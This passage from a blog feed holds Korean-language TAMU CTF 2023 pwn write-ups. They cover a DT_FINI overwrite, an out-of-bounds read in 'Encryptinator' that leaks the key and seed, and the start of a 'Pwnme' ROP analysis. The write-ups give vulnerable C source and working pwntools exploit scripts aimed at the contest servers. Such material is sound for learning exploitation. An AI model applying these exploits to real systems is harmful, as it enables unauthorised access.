class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> seed;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter a seed:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;seed);</span><br><span class="line">    srand(seed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter your guess:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rand() == a) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;correct!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;incorrect!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    foo();</span><br><span class="line">    bar();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;goodbye!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>사실 코드만 보고 취약점을 바로 못찾았다. 그래서 디버깅하면서 터지는 부분을 찾아봤다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov    QWORD PTR [rax], rdx</span><br></pre></td></tr></table></figure><p>위 인스트럭션에서 터졌고, 저 값들은 나의 입력값이었다. 이것을 바탕으로 어디에 <code>win</code> 함수 주소를 쓸 지 고민했다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><code>NO RELRO</code>이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000403248                 Elf64_Dyn &lt;0Dh, 4012D4h&gt; ; DT_FINI</span><br></pre></td></tr></table></figure><p>프로그램이 종료될 때 호출되는데 여기에 덮으면 된다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;randomness&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./randomness&#x27;)</span></span><br><span class="line"><span class="comment"># e = ELF(&#x27;./randomness&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;seed:&#x27;</span>, <span class="string">&#x27;4207176&#x27;</span>)<span class="comment">#  0x403248</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;guess:&#x27;</span>, <span class="string">&#x27;4198867&#x27;</span>) <span class="comment">#&#x27;0x4011D3&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;value_or_pointer_is_an_important_distinction&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fini </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Encryptinator (pwn, oob read)</title>
      <link href="/230503-tamu2023-7.Encryptinator-pwn/"/>
      <url>/230503-tamu2023-7.Encryptinator-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I have made this super secure encryption engine. I’ll encrypt any message and no one will ever be able to read it. Not even me!<br>Author: <code>_mac_</code></p></blockquote><ul><li>[31 solves &#x2F; 491 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>바이너리와 소스코드를 제공해준다. libc도 제공해줬다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LEN 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG_LEN 30</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">upkeep</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Not related to the challenge, just some stuff so the remote works correctly</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>)buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">char</span>* msg, <span class="type">int</span> len, <span class="type">char</span>* iv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> key[len];</span><br><span class="line">    FILE *file;</span><br><span class="line">    </span><br><span class="line">    file = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(key, len, <span class="number">1</span>, file);</span><br><span class="line">    fclose(file);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        msg[i] = msg[i] ^ key[i] ^ iv[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">randomize</span><span class="params">(<span class="type">char</span>* msg, <span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">long</span> seed, <span class="type">unsigned</span> <span class="type">long</span> iterations)</span> &#123;</span><br><span class="line">    seed = seed * iterations + len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iterations &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        randomize(msg, len, seed, iterations- <span class="number">1</span>); <span class="comment">// 실행시켜야 스택이 높아져서 print_hex할 때 encrypt함수의 key 값이 남아있음</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        encrypt(msg, len, ((<span class="type">char</span> *) &amp;seed)); <span class="comment">// 안그러면 key 값이 덮혀서 안보임</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> option;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nSelect from the options below:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1. Encrypt a message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2. View the encrypted message\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3. Quit\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;option);</span><br><span class="line">    <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> option;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">console</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    <span class="type">long</span> seed;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">int</span> read_len;</span><br><span class="line">    <span class="type">char</span> buf[MAX_LEN] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span>(menu()) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                <span class="comment">// get user input</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nPlease enter message to encrypt: &quot;</span>);</span><br><span class="line">                fgets(buf, MAX_LEN-FLAG_LEN, <span class="built_in">stdin</span>);</span><br><span class="line">                len = <span class="built_in">strlen</span>(buf);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// add flag to the buffer</span></span><br><span class="line">                file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">                fread(buf + len, FLAG_LEN, <span class="number">1</span>, file);</span><br><span class="line">                fclose(file);</span><br><span class="line">                len += FLAG_LEN;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// encrypt</span></span><br><span class="line">                seed = ((<span class="type">long</span>) rand()) &lt;&lt; <span class="number">32</span> + rand();</span><br><span class="line">                randomize(buf, len, seed, buf[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span>(len == <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Sorry, you need to encrypt a message first.\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                index = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nRead a substring of the encrypted message.&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nPlease enter the starting index (%d - %d): &quot;</span>, index, len);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">                <span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (index &gt; len) &#123; </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Error, index out of bounds.\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your encrypted string with the flag:\n&quot;</span>);</span><br><span class="line">                print_hex(buf+index, len - index); <span class="comment">// oob read</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;goodbye.\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;There was an error processing that request, please try again.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>)); </span><br><span class="line">    upkeep();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// welcome</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to my encryption engine: ENCRYPT-INATOR!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ll encrypt anything you want but no guarantees you&#x27;ll be able to decrypt it,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I haven&#x27;t quite figured out how to do that yet... :(\n&quot;</span>); </span><br><span class="line">    console();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2번 메뉴에서 <code>index</code>가 음수가 가능하기 때문에 <code>print_hex(buf+index, len - index);</code>에서 <code>oob</code>가 발생할 수 있다. <code>buf</code> 이전에 있는 것을 출력할 수 있다. 이것으로 <code>seed</code>와 <code>key</code>를 구할 수 있다.</p><p>사실상 <code>seed</code>와 <code>key</code>만 알면 <code>flag</code>는 바로 구할 수 있을 것 같다. 참고로 encrypt된 flag도 <code>print_hex(buf+index, len - index);</code>를 통해서 바로 구할 수 있기 때문에 당연히 <code>flag</code>를 계산할 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">    msg[i] = msg[i] ^ key[i] ^ iv[i % <span class="number">8</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>xor</code>을 한 번 더 진행하면 된다.</p><p><code>key</code>를 leak할 때 주의해야할 것이 있다. 주석에도 써놨듯이 <code>randomize()</code> 함수에서 <code>iteration</code>이 1 이상이어야 <code>randomize(msg, len, seed, iterations- 1);</code> 을 한 번 더 호출하는데, 이렇게 해야지 stack이 높아져서 <code>key</code> 값이 남아있다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;encryptinator&quot;</span>) </span><br><span class="line"><span class="comment"># p = process(&#x27;./encryptinator&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./encryptinator&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">7</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(-<span class="number">4800</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line"></span><br><span class="line">key_leak = p.recvline()[:<span class="number">38</span>*<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key_leak&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key_leak))</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">76</span>, <span class="number">2</span>):</span><br><span class="line">    key.append(<span class="built_in">int</span>(key_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(-<span class="number">4648</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(3)</span></span><br><span class="line">seed_leak = p.recvline()[:<span class="number">8</span>*<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(seed_leak))</span><br><span class="line"></span><br><span class="line">seed = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">2</span>):</span><br><span class="line">    seed.append(<span class="built_in">int</span>(seed_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(seed))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment"># sleep(3)</span></span><br><span class="line">flag_leak = p.recvline()[:<span class="number">38</span>*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">76</span>, <span class="number">2</span>):</span><br><span class="line">    flag.append(<span class="built_in">int</span>(flag_leak[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(flag))</span><br><span class="line"></span><br><span class="line">real_flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">38</span>):</span><br><span class="line">    flag[i] = flag[i] ^ key[i] ^ seed[i % <span class="number">8</span>]</span><br><span class="line">    real_flag.append(<span class="built_in">chr</span>(flag[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;####&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(flag))</span><br><span class="line"></span><br><span class="line">real_flag = <span class="string">&#x27;&#x27;</span>.join(real_flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(real_flag))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;00ps_b4d_3rr0r_ch3ck1ng&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Pwnme (pwn, sub rsp, 0x18)</title>
      <link href="/230503-tamu2023-8.Pwnme-pwn/"/>
      <url>/230503-tamu2023-8.Pwnme-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>pwn me. that’s it.<br>Author: <code>_mac_</code></p></blockquote><ul><li>[26 solves &#x2F; 494 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>바이너리와 커스텀라이브러리를 제공해준다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  pwnme(argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>문제 바이너리는 위와 같다. 커스텀라이브러리의 함수를 하나 호출해주고 끝난다. <code>puts</code> 같은 것도 없어서 정말 할 것이 없다. </p><p>커스텀라이브러리에는 아래 함수가 끝이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setup();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;pwn me&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x48</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>정말 할 것이 아무것도 안보이고 코드가 간단해서 뭐 할지 한참을 고민했다. 이럴 땐 가젯을 한번 봐야한다. 그리고 <code>pwnme</code> 함수에서 <code>read</code> 함수를 실행할 때 레지스터 상황도 봐주는 것이 좋다. overflow가 생각보다 크게 안나기 때문에 레지스터 값을 굳이 안바꾸어줘도 되는 것은 안바꾸어주기 위해서이다.</p><ul><li>레지스터 상황</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rax</span>   : 0x48              </span><br><span class="line"><span class="variable">$rbx</span>   : 